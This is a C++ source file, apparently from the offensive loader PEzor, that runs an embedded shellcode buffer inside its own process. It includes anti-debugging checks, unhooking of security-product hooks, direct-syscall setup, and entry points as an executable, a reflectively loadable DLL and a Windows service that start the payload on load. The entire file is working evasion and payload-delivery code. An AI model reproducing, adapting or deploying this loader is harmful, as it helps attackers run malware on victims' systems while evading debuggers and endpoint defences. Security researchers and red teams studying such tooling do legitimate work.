#pragma clang diagnostic ignored "-Wnested-anon-types"
#pragma clang diagnostic ignored "-Wgnu-anonymous-struct"

#ifdef SHAREDOBJECT
#ifdef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "ReflectiveDLLInjection/dll/src/ReflectiveLoader.h"
extern HINSTANCE hAppInstance;
#endif
#endif

#include "PEzor.hpp"

#define NT_FAIL(status) (status < 0)
#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
#define FLG_HEAP_ENABLE_FREE_CHECK 0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)

#ifdef ANTIDEBUG
inline void anti_debug(void) {
    DWORD errorValue = 1111;
    SetLastError(errorValue);
    OutputDebugString(" ");
    if (GetLastError() != errorValue) {
        #ifdef _DEBUG_
            MessageBoxA(NULL, "Stop debugging program!", "Error", MB_OK | MB_ICONERROR);
        #endif
        exit(STATUS_SUCCESS);
    }

    __PPEB peb = GetProcessEnvironmentBlock();
    if (peb->bBeingDebugged) {
        #ifdef _DEBUG_
            MessageBoxA(NULL, "Stop debugging program!", "Error", MB_OK | MB_ICONERROR);
        #endif
        exit(STATUS_SUCCESS);
    }

    if (peb->dwNtGlobalFlag & NT_GLOBAL_FLAG_DEBUGGED) {
        #ifdef _DEBUG_
            MessageBoxA(NULL, "Stop debugging program!", "Error", MB_OK | MB_ICONERROR);
        #endif
        exit(STATUS_SUCCESS);
    }
}
#endif

int _main(int argc, char** argv) {
    #ifdef _DEBUG_
        puts("PEzor starting!");
    #endif
    #ifdef ANTIDEBUG
        #ifdef _DEBUG_
            puts("anti-debug checks");
        #endif
        anti_debug();
    #endif
    #ifdef UNHOOK
        #ifdef _DEBUG_
            puts("unhooking process");
        #endif
        RefreshPE();
    #endif
    #ifdef SYSCALLS
        my_init_syscalls_list();
    #endif
    HANDLE hThread = (HANDLE)-1;
    #if defined(SHAREDOBJECT) || defined(SERVICE_DLL)
        LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, FALSE, sleep_time);
    #else
        LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, TRUE, sleep_time);
    #endif
    if (!allocation || hThread == (HANDLE)-1) {
        #ifdef _DEBUG_
            printf("inject_shellcode_self: ERROR 0x%x", allocation);
        #endif
        return -1;
    }

    #ifdef _DEBUG_
        puts("inject_shellcode_self: OK");
    #endif
    return 0;
}

#ifdef SHAREDOBJECT
extern "C"
__declspec(dllexport)
void CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {
    while (TRUE)
        Sleep(60000);
}

__declspec(dllexport)
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
    switch (dwReason) {
        #ifdef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
        case DLL_QUERY_HMODULE:
            #ifdef _DEBUG_
                puts("DLL_QUERY_HMODULE");
            #endif
            if (lpReserved != NULL)
                *(HMODULE *)lpReserved = hAppInstance;
		break;
        #endif
        case DLL_PROCESS_ATTACH:
        #ifdef _DEBUG_
            puts("DLL_PROCESS_ATTACH");
        #endif
        #ifndef SERVICE_DLL
            _main(0, NULL);
        #endif
        break;
        case DLL_THREAD_ATTACH:
        #ifdef _DEBUG_
            puts("DLL_THREAD_ATTACH");
        #endif
        break;
        case DLL_PROCESS_DETACH:
        #ifdef _DEBUG_
            puts("DLL_PROCESS_DETACH");
        #endif
        break;
        case DLL_THREAD_DETACH:
        #ifdef _DEBUG_
            puts("DLL_THREAD_DETACH");
        #endif
        break;
    }

    return TRUE;
}
#endif

#ifdef SERVICE_EXE
#include <winsvc.h>
SERVICE_STATUS_HANDLE g_serviceStatusHandle = nullptr;
HANDLE g_hSvcStopEvent = NULL;
SERVICE_STATUS g_serviceStatus = {SERVICE_WIN32_SHARE_PROCESS, SERVICE_START_PENDING, SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE};
char cServiceName[] = "SERVICE";

__attribute__((stdcall))
DWORD HandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
    switch (dwControl) {
        case SERVICE_CONTROL_STOP:
            g_serviceStatus.dwCurrentState = SERVICE_STOPPED;
            break;
        case SERVICE_CONTROL_SHUTDOWN:
            g_serviceStatus.dwCurrentState = SERVICE_STOPPED;
            break;
        case SERVICE_CONTROL_PAUSE:
            g_serviceStatus.dwCurrentState = SERVICE_PAUSED;
            break;
        case SERVICE_CONTROL_CONTINUE:
            g_serviceStatus.dwCurrentState = SERVICE_RUNNING;
            break;
        case SERVICE_CONTROL_INTERROGATE:
        default:
            break;
    }
 
    SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);
 
    return NO_ERROR;
}

#ifdef SERVICE_DLL
extern "C"
__declspec(dllexport)
#endif
VOID ServiceMain(DWORD dwArgc, LPCWSTR* lpszArgv) {
    if (dwArgc > 0)
        g_serviceStatusHandle = RegisterServiceCtrlHandlerW(lpszArgv[0], (LPHANDLER_FUNCTION)HandlerEx);
    else
        g_serviceStatusHandle = RegisterServiceCtrlHandlerW(L"SvcHostDemo", (LPHANDLER_FUNCTION)HandlerEx);

    if (!g_serviceStatusHandle) {
        g_serviceStatus.dwCurrentState = SERVICE_STOPPED;
        g_serviceStatus.dwWin32ExitCode = SERVICE_ERROR_SEVERE;
        SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);
        return;
    }

    g_serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);

    _main(0, NULL);
}

#ifndef SERVICE_DLL
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	SERVICE_TABLE_ENTRY st[] = {
        { (LPSTR)&cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&ServiceMain },
        { NULL, NULL }
    };
	return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&st );
}
#endif
#else
int main(int argc, char** argv) {
    return _main(argc, argv);
}
#endif
